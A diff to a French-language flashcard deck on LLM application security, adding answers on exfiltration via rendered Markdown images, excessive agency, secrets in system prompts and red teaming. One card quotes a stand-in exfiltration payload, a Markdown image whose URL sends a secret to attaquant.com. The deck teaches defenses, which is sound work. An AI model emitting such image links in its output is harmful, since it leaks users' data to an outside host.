@@ -44,11 +44,15 @@ Comment une exfiltration peut-elle se produire sans outil explicite ? <!--anki:7
 ?
 Par exemple via une **image Markdown** dont l'URL contient les données (`![](https://attaquant.com/?d=SECRET)`), chargée automatiquement par l'interface. D'où le filtrage des URLs et du rendu des sorties.
 
+Le navigateur ou le serveur de rendu réalise alors la requête réseau, même si l'agent ne dispose pas d'un outil d'envoi explicite. Bloquer les chargements externes non autorisés, assainir le rendu et contrôler les redirections. Le contrôle doit porter sur ce que l'interface exécute, pas seulement sur la liste d'outils visible par le modèle.
+
 ---
 
 Qu'est-ce que l'excessive agency ? <!--anki:7943244e636f73475571-->
 ?
 Donner à un agent **plus de fonctions, de permissions ou d'autonomie** que nécessaire. Réponse : **moindre privilège** (outils minimaux, droits de l'utilisateur, lecture seule par défaut) et [[31-agents-fondamentaux|human-in-the-loop]] pour les actions sensibles.
+
+Exemple : un assistant qui doit lire une facture n'a pas besoin de pouvoir modifier tous les comptes clients. Réduire séparément les fonctions disponibles, les ressources accessibles et les actions sans validation. Des consignes de prudence ne compensent pas un compte de service trop puissant ; l'autorisation doit être vérifiée à l'exécution.
 
 ---
 
@@ -96,13 +100,17 @@ Deux règles : le filtre est **construit par le code** à partir de l'identité 
 
 Pourquoi ne pas mettre de secrets dans le system prompt ? <!--anki:79693068352c4d69676d-->
 ?
-Parce qu'il **fuit** : avec assez d'essais, un utilisateur peut le faire répéter. Clés, mots de passe et règles de sécurité doivent vivre **hors du modèle** (code, IAM, [[81-litellm-api-layer|gateway]]).
+Le system prompt **n'est pas un coffre-fort** : son contenu peut être reproduit, transformé ou révélé par une attaque ou une erreur. On ne doit donc pas fonder la confidentialité d'un secret sur la seule consigne de ne pas l'afficher.
+
+Conserver clés et mots de passe dans un gestionnaire de secrets, utilisés par le code avec des droits limités. Les règles peuvent être décrites dans le prompt, mais leur application effective doit vivre hors du modèle : IAM, validation et [[81-litellm-api-layer|gateway]].
 
 ---
 
 Qu'est-ce que le red teaming LLM ? <!--anki:713e5f4c26353f69634e-->
 ?
 **Attaquer volontairement** son application (injections, jailbreaks, exfiltration) avant et après la mise en production, manuellement ou avec des outils comme **garak**, **PyRIT** ou **promptfoo**, et transformer les attaques réussies en **tests de régression**.
+
+Définir un périmètre autorisé, des objectifs d'attaque et des critères observables : accès indu, action non autorisée, fuite de données. Tester l'ensemble de l'application, y compris rendu, outils et mémoire. Une liste d'attaques toutes bloquées ne prouve pas l'absence de faille ; varier les scénarios et documenter les limites de couverture.
 
 ---
 
